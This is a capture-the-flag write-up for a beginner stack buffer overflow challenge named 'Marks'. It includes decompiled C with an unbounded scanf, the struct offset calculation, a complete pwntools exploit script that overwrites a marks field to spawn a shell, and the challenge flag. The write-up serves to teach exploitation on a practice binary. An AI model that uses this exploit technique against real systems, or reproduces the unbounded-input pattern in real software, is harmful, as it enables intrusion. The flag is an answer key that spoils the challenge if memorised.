---
linkTitle: Marks
title: Beginner - Marks
type: docs
---

* Author : P3g4su5   
* Difficulty : Beginner   
* Description : Score 100/100 to pass this exam 
* Attachments : [marks.zip](https://github.com/Parth-Badgujar/BackdoorCTF-23-Pwn/raw/main/Marks/public/marks.zip)  

## Writeup

This was a simple challenge were we had to overflow into that `marks` variable and set its value to `100` to gain the shell 

Here is the decompiled code by IDA: 

```C
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char v5[32]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v6; // [rsp+20h] [rbp-50h] BYREF
  __int64 v7; // [rsp+60h] [rbp-10h] BYREF
  unsigned __int64 v8; // [rsp+68h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  v3 = time(0LL);
  srand(v3);
  puts("Enter your details to view your marks ...");
  printf("Roll Number : ");
  __isoc99_scanf("%d", &v7);
  printf("Name : ");
  __isoc99_scanf("%s", v5);
  puts("Please Wait ...\n");
  usleep(0xF4240u);
  HIDWORD(v7) = rand() % 75;
  printf("You got %d marks out of 100\n", HIDWORD(v7));
  puts("Any Comments ?");
  __isoc99_scanf("%s", &v6);
  puts("Thanks !");
  if ( HIDWORD(v7) == 100 )
  {
    puts("Cool ! Here is your shell !");
    system("/bin/sh");
  }
  else
  {
    puts("Next time get 100/100 marks for shell :)");
  }
  return 0;
}
```
* As you can see `v7` is set to `rand() % 75` so its value will always be less than 75. After asking for name, roll number and showing marks, it asks for a comment from user in `scanf("%s", &v6)` format and `%s` can take any input of arbitary length thus leading to buffer overflow. 

* In actual source code all the metadata `name`, `roll`, `comment` and `marks` were stored in same struct. 

```c
typedef struct marks
{
    char name[32] ;
    char comment[64]; 
    int roll ;
    int marks ;    
} data ;
```

The first `64 bytes` of data will go into `comment`, the next `4 bytes` in `roll` and the next `4 bytes` into `marks`, so the offset after which you can overflow into marks will be `68`   

## Exploit 

Here is the complete exploit 

```python 
from pwn import *

p = process('./chal')

p.sendlineafter("Number : ", '22116969')
p.sendlineafter("Name : ", 'some_name')
p.sendlineafter("Comments ?", cyclic(68) + p32(100)) 

p.interactive()
```
--- 

#### Flag : `flag{Y0u_ju57_0v3rfl0wed_y0ur_m4rk5}`      



